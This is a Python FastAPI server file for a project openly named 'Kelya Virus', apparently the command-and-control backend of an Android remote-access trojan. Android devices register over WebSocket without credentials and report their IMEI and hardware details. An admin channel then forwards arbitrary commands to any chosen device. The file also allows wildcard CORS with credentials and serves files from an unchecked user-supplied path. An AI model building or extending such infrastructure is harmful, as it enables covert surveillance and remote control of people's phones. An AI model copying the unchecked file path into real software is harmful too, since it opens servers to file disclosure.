"""Main FastAPI application"""
import json
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query
from typing import Optional
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from pathlib import Path

from backend.config import SERVER_HOST, SERVER_PORT, DEBUG
from backend.auth.router import router as auth_router, decode_access_token
from backend.devices.router import router as devices_router
from backend.devices.api_router import router as device_api_router
from backend.devices.device_api import router as new_device_api_router
from backend.websocket.handler import ws_manager
from backend.models import DeviceInfo
from backend.database import init_db

# Create FastAPI app
app = FastAPI(
    title="Kelya Virus",
    description="Android device monitoring and control system",
    version="1.0.0"
)


@app.on_event("startup")
async def startup_event():
    """Initialize database on startup"""
    try:
        # Run migrations via Alembic (handled by deployment)
        # Just verify connection
        from backend.database import engine
        async with engine.begin() as conn:
            await conn.run_sync(lambda sync_conn: None)  # Test connection
        print("Database connection verified")
    except Exception as e:
        print(f"Database connection error: {e}")
        # Continue anyway - migrations will be run by deployment script

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Include routers
app.include_router(auth_router)
app.include_router(devices_router)
app.include_router(device_api_router)
app.include_router(new_device_api_router)


# Root endpoint will be handled by frontend serving below


@app.get("/api/stats")
async def get_stats():
    """Get system statistics"""
    devices = ws_manager.get_active_devices()
    return {
        "total_devices": len(devices),
        "online_devices": len([d for d in devices.values()]),
        "admin_connections": len(ws_manager.admin_connections)
    }


@app.websocket("/ws/device")
async def websocket_device(websocket: WebSocket, token: Optional[str] = None):
    """WebSocket endpoint for devices"""
    device_id = None
    client_ip = websocket.client.host if websocket.client else "unknown"
    
    try:
        print(f"[WS_CONNECT] New WebSocket connection attempt from {client_ip}, token: {'provided' if token else 'not provided'}")
        await websocket.accept()
        print(f"[WS_CONNECT] WebSocket connection accepted from {client_ip}")
        
        # Token-based authentication (new method)
        if token:
            print(f"[WS_AUTH] Attempting token-based authentication: {token[:16]}...")
            from backend.devices.registration import get_device_by_token
            device = await get_device_by_token(token)
            if not device:
                print(f"[WS_AUTH_ERROR] Invalid token provided: {token[:16]}...")
                await websocket.close(code=1008, reason="Invalid token")
                return
            
            print(f"[WS_AUTH_SUCCESS] Token authentication successful for device: {device.name} (ID: {str(device.id)})")
            
            # Create device info from database device
            device_info = DeviceInfo(
                id=str(device.id),
                name=device.name,
                imei=device.imei,
                model=device.model or "Unknown",
                manufacturer=device.manufacturer or "Unknown",
                android_version=device.android_version or "Unknown",
                sdk=device.sdk or 0
            )
            device_id = str(device.id)
        else:
            # Automatic registration - device sends its info
            print(f"[WS_REGISTER] Waiting for registration message from {client_ip}")
            data = await websocket.receive_text()
            message = json.loads(data)
            
            if message.get("type") != "register":
                print(f"[WS_REGISTER_ERROR] Invalid registration message type: {message.get('type')}")
                await websocket.close(code=1008, reason="Registration required")
                return
            
            print(f"[WS_REGISTER] Received registration message from {client_ip}")
            
            # Get device info from message
            device_info_data = message.get("device_info", {})
            print(f"[WS_REGISTER] Device info received: {list(device_info_data.keys())}")
            
            # Generate device ID if not provided (should always be provided by app)
            if "id" not in device_info_data or not device_info_data["id"]:
                import uuid
                device_info_data["id"] = str(uuid.uuid4())
                print(f"[WS_REGISTER] Generated new device ID: {device_info_data['id']}")
            
            # Ensure name is set (use model if name not provided)
            if "name" not in device_info_data or not device_info_data["name"]:
                manufacturer = device_info_data.get("manufacturer", "Unknown")
                model = device_info_data.get("model", "Device")
                device_info_data["name"] = f"{manufacturer} {model}".strip()
                print(f"[WS_REGISTER] Auto-generated device name: {device_info_data['name']}")
            
            # Create device info
            device_info = DeviceInfo(**device_info_data)
            device_id = device_info.id
            
            print(f"[WS_REGISTER] Processing registration for device: {device_info.name} (ID: {device_id})")
            print(f"[WS_REGISTER] Device details: {device_info.manufacturer} {device_info.model}, Android {device_info.android_version} (SDK {device_info.sdk})")
            
            # Auto-register device in database if not exists
            from backend.storage.database import storage
            existing_device = await storage.get_device(device_id)
            if not existing_device:
                # Auto-register device in database
                from backend.devices.registration import generate_device_token
                new_token = generate_device_token()
                await storage.create_device(
                    device_id=device_id,
                    name=device_info.name,
                    token=new_token,
                    imei=device_info.imei,
                    model=device_info.model,
                    manufacturer=device_info.manufacturer,
                    android_version=device_info.android_version,
                    sdk=device_info.sdk
                )
                print(f"[WS_REGISTER_SUCCESS] Auto-registered new device: {device_info.name} ({device_id})")
                print(f"[WS_REGISTER_SUCCESS] Generated token: {new_token[:16]}...")
            else:
                # Update existing device info
                print(f"[WS_REGISTER] Device already exists, updating info: {device_id}")
                await storage.update_device(
                    device_id,
                    name=device_info.name,
                    imei=device_info.imei,
                    model=device_info.model,
                    manufacturer=device_info.manufacturer,
                    android_version=device_info.android_version,
                    sdk=device_info.sdk
                )
                print(f"[WS_REGISTER_SUCCESS] Updated existing device: {device_info.name} ({device_id})")
                print(f"Device reconnected: {device_info.name} ({device_id})")
        
        # Connect device
        print(f"[WS_CONNECT] Connecting device: {device_info.name} (ID: {device_id})")
        conn = await ws_manager.connect_device(device_info, websocket)
        print(f"[WS_CONNECT_SUCCESS] Device connected successfully: {device_info.name} (ID: {device_id})")
        
        # Handle messages
        message_count = 0
        while True:
            try:
                data = await websocket.receive_text()
                message = json.loads(data)
                message_count += 1
                await ws_manager.handle_device_message(device_id, message)
            except json.JSONDecodeError as json_error:
                print(f"[WS_MESSAGE_ERROR] Failed to parse JSON from device {device_id}: {json_error}")
                print(f"[WS_MESSAGE_ERROR] Raw data: {data[:200]}...")
            except Exception as msg_error:
                import traceback
                print(f"[WS_MESSAGE_ERROR] Error handling message from device {device_id}: {msg_error}")
                print(f"[WS_MESSAGE_ERROR] Traceback: {traceback.format_exc()}")
            
    except WebSocketDisconnect:
        print(f"[WS_DISCONNECT] WebSocket disconnected for device {device_id or 'unknown'}")
        if device_id:
            await ws_manager.disconnect_device(device_id)
    except json.JSONDecodeError as json_error:
        print(f"[WS_ERROR] JSON decode error during connection: {json_error}")
        print(f"[WS_ERROR] Client IP: {client_ip}")
        if device_id:
            await ws_manager.disconnect_device(device_id)
    except Exception as e:
        import traceback
        print(f"[WS_ERROR] WebSocket device error: {e}")
        print(f"[WS_ERROR] Client IP: {client_ip}, Device ID: {device_id or 'unknown'}")
        print(f"[WS_ERROR] Traceback: {traceback.format_exc()}")
        if device_id:
            await ws_manager.disconnect_device(device_id)


@app.websocket("/ws/admin")
async def websocket_admin(
    websocket: WebSocket,
    token: str = Query(...)
):
    """WebSocket endpoint for admins"""
    # Verify token
    payload = decode_access_token(token)
    if not payload:
        await websocket.close(code=1008, reason="Invalid token")
        return
    
    try:
        await ws_manager.connect_admin(websocket)
        
        # Handle messages
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            
            # Handle admin commands
            if message.get("type") == "command":
                device_id = message.get("device_id")
                command = message.get("command")
                command_data = message.get("data", {})
                
                from backend.models import DeviceCommand
                await ws_manager.send_command(
                    device_id,
                    DeviceCommand(command=command, data=command_data)
                )
    
    except WebSocketDisconnect:
        await ws_manager.disconnect_admin(websocket)
    except Exception as e:
        print(f"WebSocket admin error: {e}")
        await ws_manager.disconnect_admin(websocket)


# Serve React frontend (if available)
frontend_path = Path(__file__).parent.parent / "frontend" / "build"
static_path = frontend_path / "static"

if frontend_path.exists() and (frontend_path / "index.html").exists():
    # Mount static files only if the directory exists
    if static_path.exists():
        app.mount("/static", StaticFiles(directory=static_path), name="static")
    
    @app.get("/")
    async def serve_root():
        """Serve React app root"""
        return FileResponse(frontend_path / "index.html")
    
    @app.get("/{full_path:path}")
    async def serve_frontend(full_path: str):
        """Serve React app for all other routes"""
        # Don't serve API routes
        if full_path.startswith("api/") or full_path.startswith("ws/"):
            from fastapi import HTTPException
            raise HTTPException(status_code=404, detail="Not found")
        
        file_path = frontend_path / full_path
        if file_path.is_file() and file_path.exists():
            return FileResponse(file_path)
        return FileResponse(frontend_path / "index.html")
else:
    @app.get("/")
    async def root():
        """Root endpoint (frontend not available)"""
        return {
            "name": "Kelya Virus",
            "version": "1.0.0",
            "status": "running",
            "frontend": "not deployed"
        }


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "backend.main:app",
        host=SERVER_HOST,
        port=SERVER_PORT,
        reload=DEBUG
    )

